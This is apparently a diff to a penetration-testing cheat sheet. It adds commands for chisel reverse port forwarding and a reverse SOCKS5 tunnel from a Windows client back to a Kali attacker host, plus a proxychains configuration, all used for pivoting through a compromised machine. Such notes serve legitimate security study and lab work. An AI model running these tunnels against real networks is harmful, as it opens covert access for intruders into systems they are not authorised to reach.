@@ -1372,9 +1372,28 @@ chmod a+x chisel
 ## Set up a reverse port forwarding
 
 ~~~ powershell
-chisel.exe client <Kali-IP>:8080 R:80:172.16.84.241:80
+.\chisel.exe client <Kali-IP>:8080 R:80:172.16.84.241:80
 ~~~
 
+## Listing chisel server(SOCKS5)
+
+~~~ bash
+chmod a+x chisel
+./chisel server -p 9001 --socks5 --reverse
+~~~
+
+## Set up a reverse port forwarding(SOCKS5)
+
+~~~ powershell
+.\chisel.exe client <Kali-IP>:9001 R:socks
+~~~
+
+## /etc/proxychains4.conf
+
+~~~
+[ProxyList]
+socks5  127.0.0.1 1080
+~~~
 
 # Windows Privilege Escalation
 
